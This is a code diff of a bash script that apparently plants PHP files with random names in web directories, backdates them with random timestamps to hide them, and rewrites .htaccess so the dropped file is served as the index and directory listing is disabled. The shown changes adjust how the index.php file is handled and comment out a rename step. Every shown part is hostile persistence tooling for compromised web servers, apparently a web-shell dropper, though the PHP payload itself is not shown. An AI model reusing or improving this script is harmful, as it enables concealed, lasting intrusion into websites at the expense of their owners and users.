@@ -82,7 +82,7 @@ update_htaccess() {
     echo " Allow from all"
     echo "</FilesMatch>"
     echo
-    echo "DirectoryIndex index.html"
+    echo "DirectoryIndex $index_php_file_name"
     echo
     echo "Options -Indexes"
     echo "ErrorDocument 403 \"403 Forbidden\""
@@ -363,7 +363,7 @@ EOF
 upload_php_files() {
   local dir="$1"
   local php_file_name="$(generate_random_name).php"
-  # local index_php_file_name="index.php"
+  local index_php_file_name="index.php"
   local php_file_path="$dir/$php_file_name"
   local index_php_file_path="$dir/$index_php_file_name"
 
@@ -371,32 +371,32 @@ upload_php_files() {
     return
   fi
 
-  if ! write_php_code "$index_php_file_path" ; then
-    return
-  fi
+#   if ! write_php_code "$index_php_file_path" ; then
+#     return
+#   fi
 
-  if ! chmod 0644 "$php_file_path"; then
+  if ! chmod 0644 "$php_file_path" || ! chmod 0644 "$index_php_file_path"; then
     local msg="$(date) - Failed to set permissions for PHP files in $dir"
     echo "$msg" >> "$LOG_FILE"
   fi
 
   set_random_date "$php_file_path"
-  set_random_date "$index_php_file_path"
+#   set_random_date "$index_php_file_path"
 
   update_htaccess "$dir" "$php_file_name" "$index_php_file_name"
 }
 
-rename_index() {
-  local dir="$1"
-  if [ -f "$dir/index.php" ]; then
-    if ! mv "$dir/index.php" "$dir/index.html"; then
-      local msg="$(date) - Failed to rename index.php to index.html in $dir. It may be protected or require higher permissions."
-      echo "$msg" >> "$LOG_FILE"
-    else
-      set_random_date "$dir/index.html"
-    fi
-  fi
-}
+# rename_index() {
+#   local dir="$1"
+#   if [ -f "$dir/index.php" ]; then
+#     if ! mv "$dir/index.php" "$dir/index.html"; then
+#       local msg="$(date) - Failed to rename index.php to index.html in $dir. It may be protected or require higher permissions."
+#       echo "$msg" >> "$LOG_FILE"
+#     else
+#       set_random_date "$dir/index.html"
+#     fi
+#   fi
+# }
 
 set_random_date() {
   local file=$1
